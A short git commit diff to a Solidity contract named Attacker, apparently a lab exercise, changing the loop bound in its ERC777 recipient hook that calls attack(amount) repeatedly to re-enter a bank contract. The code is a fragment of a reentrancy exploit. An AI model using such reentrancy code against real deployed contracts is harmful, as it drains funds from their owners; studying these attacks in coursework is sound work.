66e484029497f7f5778d51420a94b75c376ce413
lawrencechangit <118051543+lawrencechangit@users.noreply.github.com>
2023-03-20 11:36:47 +0800

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -65,7 +65,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO RECURSE GOES HERE
 			//ERC777 token = bank.token();
 			//require(msg.sender == address(token), "Invalid token");
-			 for (uint i = depth; i < max_depth; i++) {
+			 for (uint i = depth; i <= max_depth; i++) {
            			attack(amount);
        }
 				
